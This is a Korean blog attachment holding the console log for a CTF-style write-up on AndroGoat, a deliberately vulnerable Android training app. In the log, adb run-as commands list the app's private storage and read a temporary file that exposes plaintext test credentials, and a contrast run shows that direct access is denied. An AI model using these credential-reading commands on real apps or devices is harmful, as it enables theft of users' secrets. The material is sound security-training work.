---
{"title":"15_temp_extract_console.txt","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"03_storage/15_temp_extract_console.txt · 콘솔·로그 기록 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `03_storage/15_temp_extract_console.txt` · 콘솔·로그 기록.

<pre><code>﻿PS&gt; adb shell run-as owasp.sat.agoat ls -l
total 48
drwxrws--x 2 u0_a174 u0_a174_cache 4096 2026-11-12 03:03 cache
drwxrws--x 2 u0_a174 u0_a174_cache 4096 2026-11-12 03:03 code_cache
drwxrwx--x 2 u0_a174 u0_a174       4096 2026-11-12 03:53 databases
drwxrwx--x 2 u0_a174 u0_a174       4096 2026-11-12 03:52 files
drwxrwx--x 2 u0_a174 u0_a174       4096 2026-11-12 03:53 shared_prefs
-rw------- 1 u0_a174 u0_a174         41 2026-11-12 03:54 users689386731629139472tmp
PS&gt; adb shell run-as owasp.sat.agoat sh -c &#x27;cat users*tmp&#x27;
username is carol
password is Car0l#Temp

# [대조] 일반 권한에서 직접 접근
PS&gt; adb shell ls -ld /data/data/owasp.sat.agoat
drwx------ 7 u0_a174 u0_a174 4096 2026-11-12 03:54 /data/data/owasp.sat.agoat
PS&gt; adb shell su shell sh -c &#x27;cat /data/data/owasp.sat.agoat/users*tmp&#x27;
cat: /data/data/owasp.sat.agoat/users*tmp: Permission denied
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
